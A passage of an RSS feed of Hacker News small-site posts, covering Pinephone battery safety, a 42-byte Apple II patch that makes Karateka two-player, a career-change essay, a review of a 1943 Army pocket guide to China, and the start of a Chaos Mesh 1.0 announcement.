	<li>DT contains NTC coefficients (perhaps also on the battery&nbsp;node)</li>

	<li>some routine would use all this info from DT to calculate code words used by
	AXP803 ADC and program them to PMIC (either in ATF, or&nbsp;Linux)</li>
</ul>

<p>Kernel also has support for NTC devices, so maybe NTC can be described
outside of the battery node (even though it's&nbsp;part of the battery).</p>

<p>This may all fail to be upstreamed on one thing: the battery is user
swappable, so it's&nbsp;arguably not part of the Pinephone, and describing it inside
the pinephone DT will not be appropriate.</p>

<p>I&nbsp;don't have any plans implementing any of the above, atm. Maybe with the
exception of adding a 4th approach to the fix to my Linux kernel (the easiest
one ;)). I'd like to work on my multi-boot image. So these are mostly pointers
for somebody else who'd like to tackle&nbsp;this.</p>

<h3 id="toc-other-issues">Other issues</h3>

<p>Fast charging is not necesary in many situations, so having it as a default
is not great. User should be able to decide if he wants to trade off slower,
safer charging and battery longetivity over speed. This tradeoff can be realized
in many&nbsp;ways.</p>

<p>All this is already controllable from userspace via sysfs. Ideally there
would be some charging monitoring daemon that would take into account
users's&nbsp;wishes and select proper strategy for charging, based on preference for
battery longetivity or&nbsp;speed.</p>

<p>There are several trade offs the deamon would be able to handle:</p>

<ul>
	<li>0.2C charging all the way (slow, but safer)</li>

	<li>0.5C charging to 40% and 0.2C charging to 100% (middle ground)</li>

	<li>0.5C charging all the way to 100%</li>
</ul>

<p>All this is decision making that doesn't belong to the kernel.</p>

<p>Similar daemon could monitor power usage of the phone and try to limit it to
safer levels, or warn the user if that's&nbsp;not possible.</p>
</article>

<article id="017">
<h2 id="toc-2020-09-18-let-s-talk-about-safety-of-pinephone">2020‚Äì09‚Äì18:
Let's&nbsp;talk about safety of Pinephone</h2>

<p>My gf read me some articles about exploding phones today. :) I&nbsp;think there
needs to be some serious conversation about Pinephone safety. Safety needs to
become an important concern now, when more and more people are getting their
Pinephones every month. It's&nbsp;just a matter of time before the first major
safety incident hits this community, and it may be more than just a hacked
store. It's&nbsp;just a numbers&nbsp;game.</p>

<p>Pinephone is an interesting device in one way. You can run whatever software
you like on it (and you do!), and this software comes almost universally with
<strong>zero</strong> guarantees. Read the license to any of the program you run
on your Pinephone and it will almost certainly tell&nbsp;you:</p>

<blockquote>
	<p>THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
	WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
	MERCHANTABILITY AND FITNESS FOR A&nbsp;PARTICULAR PURPOSE.</p>
</blockquote>

<p>or</p>

<blockquote>
	<p>THIS SOFTWARE IS PROVIDED BY &lt;COPYRIGHT HOLDER&gt; AS IS AND ANY EXPRESS
	OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
	MERCHANTABILITY AND FITNESS FOR A&nbsp;PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
	EVENT SHALL &lt;COPYRIGHT HOLDER&gt; BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</p>
</blockquote>

<p>or</p>

<blockquote>
	<p>This program is distributed in the hope that it will be useful, but WITHOUT
	ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
	FOR A&nbsp;PARTICULAR PURPOSE. See the GNU General Public License for more
	details.</p>
</blockquote>

<p>etc.</p>

<p>In case of Pinephone you have to take these warnings <strong>very
seriously</strong>, because this software is not provided by the manufacturer
(Pine64), and as far as I&nbsp;know, there's&nbsp;no software related safety testing
going on at&nbsp;all.</p>

<h3 id="toc-some-skeletons-hiding-at-the-lower-levels">Some skeletons, hiding at
the lower levels‚Ä¶</h3>

<p>I'll give you a few reasons why things may not be so rosy, when it comes to
safety.</p>

<p>There's&nbsp;no unchangeable well tested guardian angel management engine that
safely manages battery, power supplies, thermal behavior, that is provided by
the manufacturer, and that is independent of the operating system.</p>

<p>Pinephone's&nbsp;SoC is quite bare when it comes to software/firmware
(that's&nbsp;why FOSS enthusiasts like it, no blobs, you know!). This has a dark</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://xnux.eu/log/#017">https://xnux.eu/log/#017</a></em></p>]]>
            </description>
            <link>https://xnux.eu/log/#017</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596248</guid>
            <pubDate>Sat, 26 Sep 2020 03:45:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Karateka Two Player]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24596237">thread link</a>) | @bane
<br/>
September 25, 2020 | https://retroconnector.com/karateka-two-player/ | <a href="https://web.archive.org/web/*/https://retroconnector.com/karateka-two-player/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
		<!-- #masthead .site-header -->

	<div id="main">

		<div id="primary">
			<div id="content" role="main">

				
					
<article id="post-1030" class="page">
	<!-- .entry-header -->

	<div>
		<p>KansasFest 2019 presentation, ‚ÄúReady Player Two‚Äù</p>
<p><span><iframe type="text/html" width="680" height="383" src="https://www.youtube.com/embed/T3Qj0vnZx7Y?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>One of the first games I ever played on my family‚Äôs Apple IIe was the <a href="https://en.wikipedia.org/wiki/Karateka_(video_game)">Jordan Mechner master work, Karateka</a>. Fight the bad guys, save the princess ‚Äì it‚Äôs a simple but classic formula. My brother and I would take turns making our way through Akuma‚Äôs fortress. Even then, we wanted a two player version.</p>
<p>Fast forward more than 30 years, and I‚Äôve taught myself 6502 assembly after getting back into the Apple II, through the thriving community online. The idea of a two player version of Karateka came back to me while at <a href="http://kansasfest.org/">KansasFest</a> a couple of years ago. I noodled a little on it back then, getting distracted by finding the code that created the <a href="https://github.com/option8/ksynth">unique music</a> in the game.</p>
<p>Long story short: I finally found the places in the game code that needed patching to allow a second player to control the enemies in the game, and create a functioning two player version of Karateka. The resulting patch is only 42 bytes long. <a href="https://archive.org/details/karateka-two-player">A DSK image is downloadable and playable online at the Internet Archive.</a></p>
<p><strong>[Update, August 20, 2018]:</strong> Some people seem to think I had access to the Karateka source code to make my edits. As far as I know, that source code is unreleased, still in Jordan Mechner‚Äôs archives somewhere. Instead, I fired up the game in my Apple II emulator of choice, <a href="http://virtualii.com/">Virtual ][</a>&nbsp;and froze the game state. Stepping through instructions, I followed the assembly as it built up each frame of animation, triggered events and eventually found where the player and enemy performed their attacks. By comparing memory states from before and after the enemy attacks, I found a handful of zero-page variables that, when I changed them manually, would trigger a punch or kick.</p>
<p>From there, it was a matter of finding the routines that read and wrote to those memory locations, and inserting my own code to listen instead for the keyboard to trigger each action.</p>
<p><strong>[Update, August 23, 2018]:</strong> Robin Harbron has ported the two-player patch over to the Commodore 64 port of Karateka. <a href="http://psw.ca/robin/?p=271">You can read Robin‚Äôs write-up here:&nbsp;http://psw.ca/robin/?p=271</a></p>
<p>Digging a little deeper than my original patches, Robin added the ability for the second player to move backward as well as forward. I‚Äôll have to back-port that to my version.</p>
<p><a href="https://archive.org/details/karateka-two-player"><img src="https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot-1024x710.png?resize=680%2C471" alt="" width="680" height="471" srcset="https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=1024%2C710&amp;ssl=1 1024w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=300%2C208&amp;ssl=1 300w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=768%2C532&amp;ssl=1 768w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=148%2C103&amp;ssl=1 148w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=31%2C21&amp;ssl=1 31w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=38%2C26&amp;ssl=1 38w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?resize=310%2C215&amp;ssl=1 310w, https://i2.wp.com/retroconnector.com/wp-content/uploads/2018/08/ScreenShot.png?w=1134&amp;ssl=1 1134w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1"></a></p>
<h3>Player 1 controls:</h3>
<ul>
<li>Q,A,Z to punch</li>
<li>W,S,X to kick</li>
<li>C,V to move/run</li>
<li>SPACE to go from standing to fighting stance and back.</li>
</ul>
<h3>Player 2 controls:</h3>
<ul>
<li>N to kick</li>
<li>M to punch</li>
<li>&lt; to move left</li>
</ul>
<p>Thanks to <a href="https://www.youtube.com/channel/UCrnCRkPLoXXzTtWX9dBJsnA">Chris Torrence</a>, for helping spelunk the game‚Äôs memory layout; to <a href="https://www.brutaldeluxe.fr/">Antoine Vignau</a> for his clean DSK crack and a patch to skip the intro and get right into fighting; <a href="https://twitter.com/a2_4am">4AM</a>&nbsp;for inspiration and helping test.</p>
<h3>Patch Details:</h3>
<p>Addresses are locations in memory after the game finishes loading.</p>
<p>Before the enemy fighter punches, code loads the Accumulator with D7 then jumps to $6540. A kick is similar, but loads A with C5. I patched those pieces at $6C11 (punch) and $6C20 (kick) instead to read the keyboard buffer and load the appropriate byte into the Accumulator. Otherwise, it goes along to $6540 with 00, which does nothing.</p>
<ul>
<li>$6C11: D0 1C C5 21 D0 18 A9 00 85 29 A9 D7 -&gt; AD 00 C0 C9 CD D0 02 A9 D7 8D 10 C0 (M to punch, clears strobe)</li>
<li>$6C20: 20 95 6C C5 D7 B0 08 20 71 6C A9 C5 -&gt; AD 00 C0 C9 CE D0 02 A9 C5 8D 10 C0&nbsp; (N to kick, clears strobe)</li>
</ul>
<p><span>Code at $6B9B seems to check if the distance between fighters ($33) is too far, trigger the enemy to move closer. This happens with a JMP to 6C52. I read the keyboard ($C000) and check for the comma/less-than.</span></p>
<ul>
<li>$6B9B: A6 33 E0 0C 90 03 4C 52 6C E0 07 B0 02 -&gt; AD 00 C0 EA EA EA C9 AC D0 03 4C 52 6C&nbsp; (&lt;&nbsp; to move player 2)</li>
</ul>
<p>To be able to check the keyboard while the game is usually busy animating the enemy fighter, I had to find where the keyboard strobe ($C010) was cleared, and NOP it. This happens several places in the main loop, but patching at $6EA9 kept the keyboard buffer long enough for me to check it.</p>
<ul>
<li>$6EA9: 8D 10 C0 -&gt; EA EA EA (keep from clearing keyboard strobe)</li>
</ul>
<p>Once the second player controls were working, I modified the first player controls so both players could huddle around the keyboard and not cross over each other:</p>
<ul>
<li>$6e8e: 88 -&gt; C3 (C to move left instead of ctrl-H/left arrow)</li>
<li>$6e98: 95 -&gt; D6 (V to move right instead of ctrl-U/right arrow)</li>
</ul>
<p>Bonus: Now defaults to keyboard controls without having to hit K at the beginning.</p>
<ul>
<li>$b9a8: A5 C4 D0 00 -&gt; A9 01 85 C4 (default to keyboard control, ignores joystick)</li>
</ul>
					</div><!-- .entry-content -->
</article><!-- #post-1030 -->

					

	<!-- #comments .comments-area -->

				
			</div><!-- #content .site-content -->
		</div><!-- #primary .content-area -->

		<!-- #secondary .widget-area -->

	</div><!-- #main .site-main -->

	<!-- #colophon .site-footer -->
</div></div>]]>
            </description>
            <link>https://retroconnector.com/karateka-two-player/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596237</guid>
            <pubDate>Sat, 26 Sep 2020 03:42:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I turned down a million dollar job to code and do Lambda School]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24596211">thread link</a>) | @adhamabdelf
<br/>
September 25, 2020 | https://rightalot.com/blog/2020919layer-build-and-risk | <a href="https://web.archive.org/web/*/https://rightalot.com/blog/2020919layer-build-and-risk">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1601004858557_6995"><div><h3>Why I turned down a million dollar job to code and do Lambda School</h3><p>I have this habit of writing emails to myself to structure my thinking. This is one of those emails with some adjustments for sharing publicly. </p><p>Let me be honest right off the bat; this won‚Äôt be one of those ‚Äúcoding rules! anyone who doesn‚Äôt code shouldn‚Äôt be listened to!‚Äù cult pieces. Quite the contrary.</p><p>There is something deeply satisfying about creating things that solve a problem -any problem- in a better way. I mean there‚Äôs something deeply satisfying about creating things period. I don‚Äôt know exactly what it is -and we can argue forever about the existential anxiety roots of craving problem solving as a form of meaning for life- but it‚Äôs definitely there. I personally find building technology that simplifies complex problems or streamlines unnecessarily convoluted processes to be the most satisfying flavor of that.</p><p>That‚Äôs why despite not having a lot of savings (long story), having a 1 Million dollar job at my hands (thus finally comfort and building ‚Äúwealth‚Äù) and against the advice of everyone I know (well except my brother) I decided it‚Äôs time to build computer science skills. To code.</p><h2>The backstory</h2><p>I started out my career on the ‚Äúbusiness‚Äù side of things on the other side of the world (America being ‚Äúthis side‚Äù). Landed a couple of decent -and excruciatingly boring- corporate jobs at Fortune 500 companies‚Äô local offices for a couple of years before I quit without a plan. I had to. If I had stayed one more day I would have walked into the office and started banging my head against a wall screaming ‚ÄúNone of us has a real job‚Äù on repeat. I kept applying to jobs I thought at the time would be intellectually challenging and that can be a gateway to get me into the ‚Äútechnology space‚Äù in America (more on why later). By some whiff of good luck I got into management consulting at its most sought after name; McKinsey. A couple of years later I transferred to their New York office, started a full-time MBA at Columbia and was well on my way to do what I wanted to do. A few years after that I had founded a -failed- startup, advised on some very interesting technology &amp; strategy topics (when I went back to McKinsey) and worked at a leadership role at a dream company of mine; Amazon. I was super lucky.</p><p>Until October 2019 I had a great job at Amazon. I led a big team doing product management, marketplace growth &amp; data science for one of the e-commerce businesses. It had been 3 years in that role during which the business grew ~800% into multi-billion dollars of revenue which was super exciting. I loved my team, my boss and the company culture. We built things many people wanted. In short, many real -not vanity- metrics were checked for me. In addition, my Amazon stock compensation had skyrocketed in value so I was making great money.</p><p>Ironically, I started getting the ‚Äúwalk in and bang my head against the wall‚Äù urge again. This time I knew what the issue was though so I made a plan. In fact I had known one of the issues for quite a long time but the time to act on it hadn‚Äôt come -for many personal reasons- until now.</p><p>While I was finalizing that plan -it involved quitting the large corporate world at least for a while- a headhunter reached out about a very senior role at a Fortune 100. After some back and forth, I agreed to talk because ‚Äúthere‚Äôs nothing to lose and it would be good networking anyway‚Äù. They quickly made me an offer. Self delusion kicked in.</p><p>The three delusion flavors of that week were: 1. ‚ÄúYou can‚Äôt pass on landing a C-level job at a Fortune 100 in your damn 30s! Remember where you started!‚Äù 2. ‚ÄúYou can still build stuff. After all they are a technology company -albeit old school- and you‚Äôll lead a turn-around there‚Äù and the world champion of delusions: 3. ‚ÄúI‚Äôll do this for a couple of years then I can do my plan and take all the risk I want‚Äù.</p><p>Long story short, I took the offer and put my plan on hold.</p><p>This job was very different from my previous jobs which have all been in either tech (Amazon &amp; the startup I founded and ran for a few years out of New York) or management consulting (McKinsey). It was much more ‚Äúcushy‚Äù, focused a lot more on corporate politics and was not as intellectually challenging. My compensation would have added up to more than $1 Million per year, I was leading a large organization with hundreds of people, etc. It <strong>checked a lot of ‚Äúvanity metrics‚Äù.</strong> <strong>None of that matters and never should. </strong>Misery often comes out of comfort without purpose.</p><p><strong>8 weeks into this new cushy job I quit (most of the comp is in equity that vests over time so I didn‚Äôt make much of those big bucks ü§∑üèª‚Äç‚ôÇÔ∏è) to go back to what I had originally intended to do.</strong> It sounds crazy because of the opportunity cost but that is actually sort of the point.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600965088871_5937"><div><h3>The why: Florence</h3><p>I immigrated to the US 10 years ago because I wanted to be part of building technology that solves problems and -as naive or cliche as this sounds I don‚Äôt care- builds the future. There are many many other reasons to love America but ‚Äútechnology &amp; entrepreneurship paradise‚Äù was the main one for me. I moved my entire life for that despite having a flourishing career that would have been even much more financially lucrative -if you think short to medium term- elsewhere (for starters I would have paid literally zero taxes the last 10 years while making very similar money üòÇ). For someone who did not grow up rich by any stretch of the word this was not an easy string of decisions.</p><p>Here‚Äôs how I found myself describing it to a close friend who‚Äôs in very similar shoes a while back: ‚ÄúI‚Äôm not entirely sure why but I feel like we have a role in Florence during the renaissance. It‚Äôs almost impossible to put a price on that‚Äù</p><p>Back to that ‚Äúplan‚Äù that this post is all about. As I sat down to think about what I want to do towards the end of my time at Amazon I followed a simple framework:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600968647285_7975"><div><p>I had known for a long time that if I want to truly build things that make a dent in some problems (i.e. #2 on the list above) I need to learn how to code properly. After all <a href="https://www.wsj.com/articles/SB10001424053111903480904576512250915629460">software is -truly- eating the world</a>. But it quickly hit me how interconnected the answers to all 4 questions are. <strong>Layering skills</strong> that help you <strong>become a builder</strong> of things and <strong>taking the risks that come with that</strong> in the process are (or lack thereof) the answer to all 4 questions.</p><p>A couple of years ago I watched Marc Andreessen <a href="https://www.youtube.com/watch?v=s8QHeAv4_XE&amp;t=1442s" target="_blank">talk</a> about the best career advice he heard. He heard it from the creator of Dilbert; Scott Adams (who wrote it <a href="https://dilbertblog.typepad.com/the_dilbert_blog/2007/07/career-advice.html" target="_blank">here</a>). Layering and combining skills. I can‚Äôt overstate how much I think this is spot on. If you‚Äôre a business person who knows data science you can accomplish 10x more than any other business person. If you‚Äôre an engineer who understands business &amp; customers you can be 10x more effective than any other engineer. Etc.</p><p>I layered quite a bit of ‚Äúbusiness‚Äù skills over the years. Yet all these things fall under what I call the Business Generalist umbrella (I wrote about this <a href="https://rightalot.com/blog/2020519-the-generalist-dilemma" target="_blank">here</a>). I believe that in order to make meaningful contributions to solving hard problems in technology you need some level of participation in computer science (actually it could be participation in any kind of physics and engineering). Being able to build (hence coding) yourself not just manage others to do so vastly expands your ability to experiment, spot good ideas, develop stronger intuition and most importantly it makes you have skin in the game (see <a href="https://www.amazon.com/dp/B075HYVP7C/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">Nassim Taleb</a>).</p><p>I dabble in coding (although I am far from a professional developer) and when I do -for work or fun- it doesn‚Äôt feel like work most of the time. It feels like a hobby. Like you‚Äôre actually rolling up your sleeves and <strong>making</strong> the idea in your head. I also never felt like I‚Äôm working while I worked on small teams with people I really like that are solving something with a missionary rather than a mercenary mindset. It was definitely the case when I started my own company where a team of 5 survived for 2 years on just $200K of funding because we all were focused on building. But I‚Äôve had this experience in other situations too.</p><p>The things I‚Äôd regret the most (work-wise) when I‚Äôm 80 are risks I did not take. And as -Jeff Bezos <a href="https://www.youtube.com/watch?v=jwG_qR6XmDQ" target="_blank">puts it</a>- minimizing regret is something I believe many of us should aim for. The only real risk is taking no risks. Failure isn‚Äôt the worst outcome. Mediocrity is.</p><h3>What‚Äôs next</h3><p>I just got into <a href="http://www.lambdaschool.com/" target="_blank">Lambda School</a> and I haven‚Äôt been this excited about something in a long time. I chose Lambda over other programs including a Masters in CS for many reasons but the main one was simply that they have what I believe to be the best approach. </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600968647285_11960"><div><p>I‚Äôll be writing a separate post on the quest for how to study CS properly and why I think Lambda is the best option.</p><p>I‚Äôm going full in. I‚Äôm starting Lambda full-time to build CS skills, I‚Äôm talking with a few small teams about ideas and I am starting to put all what I‚Äôve learned about business skills into online courses/newsletter. My first goals are finishing Lambda School with a skillset that enables me to build products and to build a side part-time profitable business that enables me to have the peace of mind to continue experimenting with big ideas.</p><p>I tweet<a href="http://twitter.com/byadham" target="_blank"> @byadham</a>&nbsp;. You can follow me there as I document what I learned from my previous journey and what I‚Äôm learning from what I‚Äôm doing now. </p><blockquote><p>There‚Äôs an Arabic saying attributed to<a href="https://en.wikipedia.org/wiki/Kahlil_Gibran">&nbsp;Khalil Gibran</a>; the brilliant author of<a href="https://en.wikipedia.org/wiki/The_Prophet_%28book%29">&nbsp;The Prophet</a>&nbsp;that roughly translates to: ‚ÄúFor they should learn that the rich man is not who owns more but who needs less‚Äù.</p></blockquote><p>Cheers</p></div></div></div>]]>
            </description>
            <link>https://rightalot.com/blog/2020919layer-build-and-risk</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596211</guid>
            <pubDate>Sat, 26 Sep 2020 03:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything You Need to Know About Chinese People (According to US Gov't in 1943)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24595765">thread link</a>) | @exolymph
<br/>
September 25, 2020 | https://dormin.org/2020/09/21/everything-you-need-to-know-about-chinese-people-according-to-the-us-government-in-1943/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/09/21/everything-you-need-to-know-about-chinese-people-according-to-the-us-government-in-1943/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-838">

	
	<!-- .entry-header -->


			<div>

			<p><img src="https://images-na.ssl-images-amazon.com/images/I/514OQW-WXvL._SX258_BO1,204,203,200_.jpg" alt="A Pocket Guide To CHINA: Including Milton Caniff Cartoon Strip: Milton Caniff, Various members Special Services Division, US Army: Amazon.com: Books" width="463" height="571"></p>
<p><strong><a href="https://digitalcollections.smu.edu/digital/collection/hgp/id/681">Pocket Guide to China</a></strong> is a 64 page primer for American soldiers stationed in China during World War II written by unknown personnel of the Special Service Division of the Army Service Forces of the United States Army. The text offers insights into Chinese behavior, cultural values, food, cleanliness, social structure, military capabilities, and everything else an intrepid American spending years in the deep interior of a foreign land might need to know. The Guide is a charming time capsule of old-school liberalism, propaganda, and clunky-yet-earnest cultural tolerance, and while it‚Äôs too short for me to write a deep dive, I couldn‚Äôt help but do a quick write-up about it.</p>

<p>Much of the text is what you‚Äôd expect from a 1940s sociological analysis. There‚Äôs a lot of just-so generalizations which are probably good heuristics for behavior, but you can never quite tell if any particular advice is well-grounded, or just the vague sense of one random guy. For instance:</p>
<p>(I find it helps if you read all these quotes in an <a href="https://www.youtube.com/watch?v=nRp2u8d7lrg">old-timey newscaster voice</a>.)</p>
<blockquote><p>‚ÄúRealize in advance that the Chinese, friendly and spontaneous and natural as they are, have a few special likes and dislikes. They do not like to be touched. They don‚Äôt like to be slapped on the back, or even to shake hands, although some of the modern ones have learned this form of salutation. So don‚Äôt put your hands on anybody, in fun or fury or affection, until you know the person very well indeed.‚Äù</p></blockquote>
<p>Or:</p>
<blockquote><p>‚ÄúYou may want to buy something to take home to the girl friend. It is customary for the shopkeeper to ask considerably more than an article is worth. If you pay what is asked, he will not respect you for it. If you argue him down too much, he would prefer not to sell to you at all. If you pay about half to two-thirds what he asks, he will admire you and enjoy the transaction. But above all keep good humored throughout. In China it is a sign of bad breeding to grow heated over a purchase whether it is made successfully or not.‚Äù</p></blockquote>
<p>Having spent quite a bit of time in China myself, it‚Äôs also hilarious how accurate some advice still is:</p>
<blockquote><p>‚ÄúIt is usually wise, in personal dealings with a Chinese helper or assistant, to give him a problem and let him handle it in his own way. However, make sure that he understands you. You will rarely hear a Chinese say ‚ÄúI don‚Äôt know‚Äù when you ask him a question. ‚ÄúYes‚Äù is a stock answer and this can make for no little confusion if you don‚Äôt watch out. But if you explain carefully and protect his self-respect you won‚Äôt have any trouble.‚Äù</p></blockquote>
<p>Despite the potential over-generalizations, it‚Äôs all well-intentioned. For a random American soldier who had never been to Canada, let alone Asia, he could do a lot worse than following these guidelines when starting a multi-year stint in inland China.</p>
<p><img src="https://i.imgur.com/yr3LeQd.png" alt="PHOTOS: American G.I.s' 'A Pocket Guide to China' circa 1943 is comedy gold ‚Äì Thatsmags.com" width="701" height="428"></p>
<p>More importantly, the Guide tries to promote cooperation between Americans and their distant allies in the Orient. Thus the central paradigm of the Guide is that though Chinese people do lots of odd things, and look nothing like us, and know nothing about us‚Ä¶ that doesn‚Äôt matter. We‚Äôre all on the same team.</p>
<blockquote><p>‚Äú‚Ä¶you have to show the Chinese that Americans treat the Chinese as we treat any of our allies, and that we respect them as human beings on an equality with ourselves. Sure, there are differences. So what? There are similarities too. If you forget the differences and think of them as neighbors, as people who eat, sleep, work, and raise families as we do, you‚Äôll be over the first hurdle.‚Äù</p></blockquote>
<p>And:</p>
<blockquote><p>‚ÄúDiscourage anyone who acts as though the Chinese are queer. They are not queer. After all, there are more people in the world eating Chinese food and wearing Chinese clothes than there are eating American food and wearing American clothes. They live their way and we live ours. If you respect them, they will respect you.‚Äù</p></blockquote>
<p>It‚Äôs especially emphasized that as strange as Chinese people may seem in so many different ways, they‚Äôre just like us on what really matters:</p>
<blockquote><p>‚ÄúOf all the peoples of Asia, the Chinese are most like Americans. Those who know both people often remark at their likeness. One of the reasons, perhaps, is that we both live in countries where there is plenty of space and a great variety of climate and food. We are alike, too, because we both love independence and individual freedom.‚Äù</p></blockquote>
<p>The obvious subtext of a lot of these sections is that though the Guide itself preaches tolerance and charity toward our distant allies, the Guide authors are definitely expecting the average American soldier to be weirded out by the Chinese and automatically fall back on racism. But the Guide valiantly fights against that for moral, logical, and strategic reasons:</p>
<blockquote><p>‚ÄúIf you think of the Chinese as a yellow-skinned people of a totally different race from us, you probably will never get to know them. What‚Äôs more, you‚Äôll be playing right into the hands of Hitler and the Japs. Japan will harp on about the color question first, last, and all the time. She will tell the Chinese what she has been telling them ever since Pearl Harbor ‚Äì that Americans look down on non-white peoples and that the Chinese can never hope to be treated on terms of equality by America. ‚ÄòWhy fight for the white man?‚Äô Japan dins into Chinese ears.‚Äù</p></blockquote>
<p>And:</p>
<blockquote><p>‚ÄúThose [Chinese] you saw in America may have come from one small part in China ‚Äì the city of Canton. Judging all Chinese by those who live in one small part of the country is like judging all Americans by the residents of Hoboken, New Jersey.‚Äù</p></blockquote>
<p>I found it pretty remarkable how wise and uplifting much of the Guide is. There are some legitimately great passages about showing charity to radically different ideas and searching for common values with a people not easily understood. It‚Äôs not what you‚Äôd expect from a sociological analysis written in the 1940s.</p>
<p>But‚Ä¶ it‚Äôs still a sociological analysis written in the 1940s:</p>
<blockquote><p>‚ÄúAnother likeness is that we are both humorous people. The Chinese love a joke just as well as we do, and they laugh at the same sort of thing. Their stock jokes are the same as ours ‚Äì about professors, and doctors, and Irishmen ‚Äì the Chinese equivalent for the Irish being people from Hunan province.‚Äù</p></blockquote>
<p>Though it‚Äôs 64 pages long, the <strong>Pocket Guide to China</strong> is a short read (30+ minutes) and I recommend that anyone with an interest in China, the Asian front of WW2, or pre-civil rights era views on race and culture check it out. You can read the whole thing at this <a href="https://digitalcollections.smu.edu/digital/collection/hgp/id/681">link</a>.</p>

			
		</div><!-- .entry-content -->
	
	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://dormin.org/2020/09/21/everything-you-need-to-know-about-chinese-people-according-to-the-us-government-in-1943/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24595765</guid>
            <pubDate>Sat, 26 Sep 2020 01:44:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chaos Mesh 1.0: Chaos Engineering on Kubernetes Made Easier]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24595568">thread link</a>) | @Bella-Xiang
<br/>
September 25, 2020 | https://chaos-mesh.org/blog/chaos-mesh-1.0-chaos-engineering-on-kubernetes-made-easier | <a href="https://web.archive.org/web/*/https://chaos-mesh.org/blog/chaos-mesh-1.0-chaos-engineering-on-kubernetes-made-easier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img alt="Chaos-Mesh-1.0 - Chaos-Engineering-on-Kubernetes-Made-Easier" src="https://chaos-mesh.org/assets/images/chaos-mesh-1.0-22c3415bc75bde8501087d6c7c154cd5.png"></p><p>Today, we are proud to announce the general availability of Chaos Mesh¬Æ 1.0, following its entry into CNCF as a <a href="https://pingcap.com/blog/announcing-chaos-mesh-as-a-cncf-sandbox-project" target="_blank" rel="noopener noreferrer">sandbox project</a> in July, 2020.</p><p>Chaos Mesh 1.0 is a major milestone in the project‚Äôs development. After 10 months of effort within the open-source community, Chaos Mesh is now ready in terms of functionality, scalability, and ease of use. Here are some highlights.</p><h2>Powerful chaos support</h2><p><a href="https://chaos-mesh.org/" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> originated in the testing framework of <a href="https://pingcap.com/products/tidb" target="_blank" rel="noopener noreferrer">TiDB</a>, a distributed database, so it takes into account the possible faults of a distributed system. Chaos Mesh provides comprehensive and fine-grained fault types, covering the Pod, the network, system I/O, and the kernel. Chaos experiments are defined in YAML, which is fast and easy to use.</p><p>Chaos Mesh 1.0 supports the following fault types:</p><ul><li>clock-skew: Simulates clock skew</li><li>container-kill: Simulates the container being killed</li><li>cpu-burn: Simulates CPU pressure</li><li>io-attribution-override: Simulates file exceptions</li><li>io-fault: Simulates file system I/O errors</li><li>io-latency: Simulates file system I/O latency</li><li>kernel-injection: Simulates kernel failures</li><li>memory-burn: Simulates memory pressure</li><li>network-corrupt: Simulates network packet corruption</li><li>network-duplication: Simulates network packet duplication</li><li>network-latency: Simulate network latency</li><li>network-loss: Simulates network loss</li><li>network-partition: Simulates network partition</li><li>pod-failure: Simulates continuous unavailability of Kubernetes Pods</li><li>pod-kill: Simulates the Kubernetes Pod being killed</li></ul><h2>Visual chaos orchestration</h2><p>The Chaos Dashboard component is a one-stop web interface for Chaos Mesh users to orchestrate chaos experiments. Previously, Chaos Dashboard was only available for testing TiDB. With Chaos Mesh 1.0, it is available to everyone. Chaos Dashboard greatly simplifies the complexity of chaos experiments. With only a few mouse clicks, you can define the scope of the chaos experiment, specify the type of chaos injection, define scheduling rules, and observe 